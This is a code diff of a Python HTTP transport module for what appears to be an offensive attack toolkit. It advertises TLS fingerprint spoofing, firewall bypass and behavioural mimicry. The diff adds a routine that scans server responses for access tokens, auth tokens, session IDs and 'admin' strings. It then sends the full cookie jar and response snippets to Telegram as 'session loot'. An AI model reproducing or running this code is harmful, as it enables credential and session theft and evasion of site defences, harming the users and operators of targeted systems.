@@ -1,20 +1,34 @@
 #!/usr/bin/env python3
 """
-TRANSPORT.PY v6.4 — Centralized Stealth HTTP, TLS Evasion & Behavioral Middleware
-Ensures all modules share cookies, headers, and bypass edge firewalls seamlessly.
+TRANSPORT.PY v7.0 — Centralized Stealth HTTP, TLS Evasion & Behavioral Middleware (With Telegram Telemetry)
+Ensures all modules share cookies, headers, bypass edge firewalls seamlessly, 
+and stream unredacted session loot straight to Telegram.
 """
 import http.client
 import json
 import ssl
 import socket
 import time
+import asyncio
 from urllib.parse import urlsplit
 
-# Import advanced evasion & behavioral modules
+# Import advanced evasion, behavioral modules, and Telegram notifier
 from modules.tls_evasion import create_spoofed_ssl_context
 from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
+from modules.telegram_notifier import send_telegram_alert
 
 USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+
+def broadcast_tg_alert_sync(loot_type, details):
+    """Helper to non-blockingly fire Telegram alerts from synchronous transport methods."""
+    try:
+        loop = asyncio.get_running_loop()
+        loop.create_task(send_telegram_alert(loot_type, details))
+    except RuntimeError:
+        try:
+            asyncio.run(send_telegram_alert(loot_type, details))
+        except Exception:
+            pass
 
 class SecureTransport:
     def __init__(self, target_url):
@@ -77,10 +91,20 @@ class SecureTransport:
                 if "set-cookie" in resp_headers:
                     self.update_cookies(resp_headers["set-cookie"])
 
+                # Check for high-value authentication or session tokens in successful transport responses
+                body_lower = data.lower()
+                if res.status in [200, 201, 302] and any(k in body_lower for k in ["access_token", "auth_token", "session_id", "admin"]):
+                    transport_loot = {
+                        "endpoint": f"https://{self.host}{endpoint}",
+                        "status": res.status,
+                        "cookie_jar": self.cookie_jar,
+                        "response_snippet": data[:300]
+                    }
+                    broadcast_tg_alert_sync("Transport Layer Session Loot", transport_loot)
+
                 return res.status, resp_headers, data
 
             except (ssl.SSLError, socket.timeout, ConnectionError, OSError):
-                # If a socket drops mid-handshake or hits an EOF, back off slightly and retry
                 if attempt < retries - 1:
                     time.sleep(0.4 * (attempt + 1))
                     continue
@@ -93,4 +117,5 @@ class SecureTransport:
                         conn.close()
                     except Exception:
                         pass
+
         return 0, {}, ""
